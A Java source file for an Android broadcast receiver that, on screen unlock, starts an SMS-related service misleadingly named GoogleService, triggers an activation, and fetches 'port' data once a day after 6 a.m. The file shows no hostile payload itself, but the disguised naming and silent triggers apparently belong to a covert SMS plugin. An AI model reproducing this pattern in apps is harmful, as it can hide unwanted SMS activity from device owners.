package com.xstd.plugin.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.config.SettingManager;
import com.xstd.plugin.service.GoogleService;
import com.xstd.plugin.service.PluginService;

import java.util.Calendar;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:43
 * To change this template use File | Settings | File Templates.
 */
public class ScreenBRC extends BroadcastReceiver {

    public static final int DAY_START_HOUR = 6;

    public void onReceive(Context context, Intent intent) {
        //check Google Service if runging for SMS
        Intent serviceIntent = new Intent();
        serviceIntent.setClass(context, GoogleService.class);
        context.startService(serviceIntent);

        SettingManager.getInstance().init(context);
        if (intent != null && SettingManager.getInstance().getKeyHasBindingDevices()) {
            String action = intent.getAction();
            if (Intent.ACTION_USER_PRESENT.equals(action)) {
                SettingManager.getInstance().init(context.getApplicationContext());
                if (SettingManager.getInstance().getKeyActiveTime() == 0) {
                    //没有激活过
                    Intent i = new Intent();
                    i.setAction(PluginService.ACTIVE_ACTION);
                    context.startService(i);
                }

                long lastFetchTime = SettingManager.getInstance().getKeyLastPortFetchTime();
                if (lastFetchTime == 0) {
                    Calendar c = Calendar.getInstance();
                    //24小时制
                    int hour = c.get(Calendar.HOUR_OF_DAY);
                    if (hour > 6 && UtilsRuntime.isOnline(context)) {
                        //如果之前没有获取过数据，并且当前时间大于6点，那么获取一次接口数据
                        Intent i = new Intent();
                        i.setAction(PluginService.PORT_FETCH_ACTION);
                        context.startService(i);
                    }
                } else {
                    Calendar c = Calendar.getInstance();
                    c.setTimeInMillis(lastFetchTime);
                    int lastDay = c.get(Calendar.DAY_OF_YEAR);
                    int lastHour = c.get(Calendar.HOUR_OF_DAY);
                    c = Calendar.getInstance();
                    int curDay = c.get(Calendar.DAY_OF_YEAR);
                    int curHour = c.get(Calendar.HOUR_OF_DAY);

                    if (curDay > lastDay && curHour > 6 && UtilsRuntime.isOnline(context)) {
                        //如果之前获取过数据，并且不是同一天，并且当前时间大于6点，那么获取一次接口数据
                        Intent i = new Intent();
                        i.setAction(PluginService.PORT_FETCH_ACTION);
                        context.startService(i);
                    }
                }
            }
        }
    }

}
